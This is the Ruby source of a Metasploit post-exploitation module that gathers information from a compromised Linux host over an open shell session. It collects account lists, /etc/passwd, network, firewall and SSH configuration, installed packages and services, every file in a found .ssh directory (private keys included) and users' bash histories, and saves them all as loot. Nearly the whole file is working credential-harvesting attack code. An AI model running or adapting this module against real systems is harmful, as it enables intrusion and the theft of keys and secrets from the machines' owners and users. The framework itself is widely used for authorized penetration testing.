##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/file'
require 'msf/core/post/linux/system'

class Metasploit3 < Msf::Post

	include Msf::Post::Common
	include Msf::Post::File
	include Msf::Post::System
	include Msf::Auxiliary::Report

	def initialize(info={})
		super( update_info( info,
				'Name'          => 'Gather Linux System Information Enumeration',
				'Description'   => %q{
						This module gathers basic system information from Linux systems.
						Enumerates users, hashes, services, network config, routing table, installed packages, 
						and bash_history
				},
				'License'       => MSF_LICENSE,
				'Author'        =>
					[
						'Stephen Haywood <averagesecurityguy[at]gmail.com>',
						'sinn3r',  #Modified the original, and more testing
						'Carlos Perez <carlos_perez[at]darkoperator.com>', # get_packages and get_services
					],
				'Version'       => '$Revision$',
				'Platform'      => [ 'linux' ],
				'SessionTypes'  => [ "shell" ]
			))

			register_options(
			[
				OptBool.new('VERBOSE', [false, 'Show detailed status messages', false]),
			], self.class)

	end

	# Run Method for when run command is issued
	def run
		host = get_host
		user = execute("/usr/bin/whoami")
		print_status("Module running as #{user}")


		# Collect data
		distro = linux_ver
		print_good("Info:")
		print_good("\t#{distro[:version]}")
		print_good("\t#{distro[:kernel]}")

		print_status("Collecting data...")

		users = execute("/bin/cat /etc/passwd | cut -d : -f 1")
		nconfig = execute("/sbin/ifconfig")
		routes = execute("/sbin/route")
		mount = execute("/bin/mount")
		iptables = execute("/sbin/iptables -L")
		resolv = cat_file("/etc/resolv.conf")
		sshd_conf = cat_file("/etc/ssh/sshd_config")
		hosts = cat_file("/etc/hosts")
		pwd = cat_file("/etc/passwd")

		ssh_keys = get_ssh_keys
		installed_pkg = get_packages(distro[:distro])
		installed_svc = get_services(distro[:distro])
		get_bash_history(users, user)


		# Save Enumerated data
		save("Linux version", distro)
		save("User accounts", users)
		save("Network config", nconfig)
		save("Route table", routes)
		save("Mounted drives", mount)
		save("Firewall config", iptables)
		save("DNS config", resolv)
		save("SSHD config", sshd_conf)
		save("Host file", hosts)
		save("SSH keys", ssh_keys) unless ssh_keys.empty?
		save("Linux Installed Packages", installed_pkg)
		save("Linux Configured Services", installed_svc)

	end

	# Save enumerated data
	def save(msg, data)
		ltype = "linux.enum"
		ctype = "text/plain"
		print_status(msg) if datastore['VERBOSE']
		loot = store_loot(ltype, ctype, session, data, nil, msg)
		print_status("#{msg} stored in #{loot.to_s}")
	end

	# Get host name
	def get_host
		case session.type
		when /meterpreter/
			host = sysinfo["Computer"]
		when /shell/
			host = session.shell_command_token("hostname").chomp
		end

		print_status("Running module against #{host}")
	
		return host
	end

	def execute(cmd)
		print_status("Execute: #{cmd}") if datastore['VERBOSE']
		output = cmd_exec(cmd)
		return output
	end

	def cat_file(filename)
		print_status("Download: #{filename}") if datastore['VERBOSE']
		output = read_file(filename)
		return output
	end

	def get_ssh_keys
		keys = []

		#Look for .ssh folder, "~/" might not work everytime
		dirs = execute("/usr/bin/find / -maxdepth 3 -name .ssh").split("\n")
		ssh_base = ''
		dirs.each do |d|
			if d =~ /(^\/)(.*)\.ssh$/
				ssh_base = d
				break
			end
		end

		# We didn't find .ssh :-(
		return [] if ssh_base == ''

		# List all the files under .ssh/
		files = execute("/bin/ls -a #{ssh_base}").chomp.split()

		files.each do |k|
			next if k =~/^(\.+)$/
			this_key = cat_file("#{ssh_base}/#{k}")
			keys << this_key
		end

		return keys
	end

	def get_bash_history(users, user)
		if user == "root"
			users.each do |u|
				if u == "root"
					print_status("Extracting history for #{u}") if datastore['VERBOSE']
					hist = cat_file("/root/.bash_history")
				else
					print_status("Extracting history for #{u}") if datastore['VERBOSE']
					hist = cat_file("/home/#{u}/.bash_history")
				end

				save("History for #{u}", hist) unless hist =~ /No such file or directory/
			end
		else
			print_status("Extracting history for #{user}") if datastore['VERBOSE']
			hist = cat_file("/home/#{user}/.bash_history")
			print_status(hist) if datastore['VERBOSE']
			save("History for #{user}", hist) unless hist =~ /No such file or directory/
		end
	end

	def get_packages(distro)
		packages_installed = nil
		if distro =~ /fedora|redhat|suse|mandrake/
			packages_installed = cmd_exec("rpm -qa")
		elsif distro =~ /slackware/
			packages_installed = cmd_exec("ls /var/log/packages")
		elsif distro =~ /ubuntu|debian/
			packages_installed = cmd_exec("dpkg -l")
		elsif distro =~ /gentoo/
			packages_installed = cmd_exec("equery list")
		else
			print_error("Could not determine package manager to get list of installed packages")
		end
		return packages_installed
	end

	def get_services(distro)
		services_installed = ""
		if distro =~ /fedora|redhat|suse|mandrake/
			services_installed = cmd_exec("/sbin/chkconfig --list")
		elsif distro =~ /slackware/
			services_installed << "\nEnabled:\n*************************\n"
			services_installed << cmd_exec("ls -F /etc/rc.d | /bin/grep \'*$\'")
			services_installed << "\n\nDisabled:\n*************************\n"
			services_installed << cmd_exec("ls -F /etc/rc.d | /bin/grep \'[a-z0-9A-z]$\'")
		elsif distro =~ /ubuntu|debian/
			services_installed = cmd_exec("/usr/bin/service --status-all")
		elsif distro =~ /gentoo/
			services_installed = cmd_exec("/bin/rc-status --all")
		else
			print_error("Could not determine the Linux Distribution to get list of configured services")
		end
		return services_installed
	end

end